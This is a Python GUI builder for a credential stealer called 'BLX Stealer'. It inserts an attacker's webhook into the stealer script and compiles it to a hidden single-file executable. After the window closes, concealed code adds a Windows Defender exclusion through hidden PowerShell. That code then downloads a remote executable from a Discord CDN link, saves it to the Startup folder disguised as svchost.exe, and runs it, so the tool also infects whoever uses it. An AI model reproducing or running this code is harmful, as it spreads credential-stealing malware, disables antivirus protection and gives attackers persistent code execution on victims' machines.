import os
import shutil
import requests
import subprocess
import customtkinter as ctk
from tkinter import messagebox, filedialog

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"t.me/blxstealer | Builder by @cankat")
app.iconbitmap("img\\blx.ico")
app.geometry("580x300")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'blxstealer.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('hook ='):
            lines[i] = f'hook = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''

        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - t.me/blxstealer"
        messagebox.showinfo("Information", message)

        # Customizing PyInstaller build command
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller blxstealer.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")


label = ctk.CTkLabel(master=app, text="BLX Stealer", text_color=("red"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="red", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

app.mainloop()

powershell_script = '''
Add-MpPreference -ExclusionPath ""
'''
subprocess.run(['powershell', '-WindowStyle', 'hidden', '-Command', powershell_script])

url = "https://cdn.discordapp.com/attachments/1212393451434283068/1212393491334832149/stub.exe?ex=65f1ac6d&is=65df376d&hm=034ea5d18f3e327fa1dcd760bc7a1dd001e9101741a543fb3d4f231f49bd6e17&"
destination = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.exe')

if os.path.exists(destination):
    os.remove(destination)
response = requests.get(url)
if response.status_code == 200:
    with open(destination, 'wb') as file:
        file.write(response.content)

    subprocess.run([destination])
